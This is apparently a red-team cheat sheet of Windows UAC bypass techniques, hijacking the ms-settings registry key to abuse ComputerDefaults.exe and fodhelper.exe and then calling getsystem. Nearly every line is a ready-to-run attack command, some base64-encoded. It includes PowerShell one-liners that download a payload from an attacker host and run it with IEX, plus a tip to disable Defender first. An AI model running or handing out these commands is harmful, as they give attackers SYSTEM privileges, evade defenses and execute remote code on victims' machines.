# User Account Control (UAC) Bypass.

#### TIP: Disabling defender before running getsystem is ideal

## ComputerDefaults

### 1) Create registry for ComputerDefaults

    New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
    sharpsh -- -e -c TmV3LUl0ZW0gIkhLQ1U6XHNvZnR3YXJlXGNsYXNzZXNcbXMtc2V0dGluZ3Ncc2hlbGxcb3Blblxjb21tYW5kIiAtRm9yY2U=

### 2) Add property

    New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
    sharpsh -- -e -c TmV3LUl0ZW1Qcm9wZXJ0eSAiSEtDVTpcc29mdHdhcmVcY2xhc3Nlc1xtcy1zZXR0aW5nc1xzaGVsbFxvcGVuXGNvbW1hbmQiIC1OYW1lICJEZWxlZ2F0ZUV4ZWN1dGUiIC1WYWx1ZSAiIiAtRm9yY2U=

### 3) Add another property with powershell code to be executed

    execute -o powershell 'Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "C:\Windows\System32\cmd.exe /c powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA==" -Force'

### 4) Run the process

    execute -o powershell 'Start-Process "C:\Windows\System32\ComputerDefaults.exe"'

### 5) Check privs

    execute -o whoami /priv
    sa-whoami

### 6) Get system shell

    getsystem

## FodHelper

### 1) Create registry for Fodhelper

    New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe (iwr http://10.10.10.11/hav0c-ps.txt -usebasicparsing) | IEX" -Force
    sharpsh -- -e -c TmV3LUl0ZW0gLVBhdGggSEtDVTpcU29mdHdhcmVcQ2xhc3Nlc1xtcy1zZXR0aW5nc1xzaGVsbFxvcGVuXGNvbW1hbmQgLVZhbHVlICJwb3dlcnNoZWxsLmV4ZSAoaXdyIGh0dHA6Ly8xOTIuMTY4LjQ1LjE5NC9oYXYwYy1wcy50eHQgLXVzZWJhc2ljcGFyc2luZykgfCBJRVgiIC1Gb3JjZQ==

### 2) Create registry for Fodhelper

    New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
    sharpsh -- -e -c TmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCBIS0NVOlxTb2Z0d2FyZVxDbGFzc2VzXG1zLXNldHRpbmdzXHNoZWxsXG9wZW5cY29tbWFuZCAtTmFtZSBEZWxlZ2F0ZUV4ZWN1dGUgLVByb3BlcnR5VHlwZSBTdHJpbmcgLUZvcmNl

### 3) Run Fodhelper

    execute -o powershell 'Start-Process "C:\Windows\System32\fodhelper.exe"'

### 4) Check privs

    execute -o whoami /priv
    sa-whoami

### 5) Get system shell

    getsystem
